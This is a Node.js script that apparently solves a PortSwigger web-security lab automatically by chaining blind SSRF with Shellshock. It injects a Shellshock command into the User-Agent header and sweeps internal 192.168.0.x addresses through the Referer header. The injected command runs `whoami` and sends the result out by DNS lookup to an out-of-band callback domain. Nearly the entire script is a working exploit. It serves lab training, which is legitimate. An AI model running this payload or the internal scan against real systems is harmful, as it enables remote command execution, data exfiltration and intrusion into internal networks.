const { execFileSync } = require('child_process');

const { runLab, waitForSolved } = require('./_common.cjs');
const { cookieHeader, extractLabelBeforeMarker, makeMarker, pollForInteraction, requireInteractshDomain } = require('./_oob.cjs');

const TITLE = 'Blind SSRF with Shellshock exploitation';
const PATH = '/web-security/ssrf/blind/lab-shellshock-exploitation';

function fireBlindSsrf(labUrl, cookieValue, userAgent, referer) {
  return execFileSync('curl', [
    '-ksS',
    '-m', '8',
    `${labUrl}/product?productId=1`,
    '-H', `Cookie: ${cookieValue}`,
    '-H', `Referer: ${referer}`,
    '-H', `User-Agent: ${userAgent}`,
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ context, page, labUrl }) => {
    const domain = requireInteractshDomain();
    const marker = makeMarker('ssrf6');

    await page.goto(`${labUrl}/product?productId=1`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    const cookies = await context.cookies(labUrl);
    const cookieValue = cookieHeader(cookies);
    const userAgent = `() { :; }; echo; /usr/bin/nslookup $(whoami).${marker}.${domain}`;
    const since = Date.now();
    let callback = null;
    let hitIp = '';
    let whoami = '';

    for (let index = 1; index <= 255; index += 1) {
      const referer = `http://192.168.0.${index}:8080`;
      try {
        fireBlindSsrf(labUrl, cookieValue, userAgent, referer);
      } catch {}

      // eslint-disable-next-line no-await-in-loop
      callback = await pollForInteraction({ marker, since, timeoutMs: 1200, stepMs: 1200 });
      if (!callback) {
        continue;
      }

      hitIp = referer;
      whoami = extractLabelBeforeMarker(callback, marker, domain);
      if (whoami) {
        break;
      }
    }

    if (!callback || !whoami) {
      throw new Error('No Shellshock interactsh callback received from the internal stock checker');
    }

    const solved = await waitForSolved(page, labUrl, 90000, 5000);
    if (!solved) {
      throw new Error('Shellshock callback arrived, but the lab never marked as solved');
    }

    console.log(`RESULT_JSON:${JSON.stringify({ marker, hitIp, whoami, callback: callback['full-id'] || callback['q-name'] || '' })}`);
  },
});
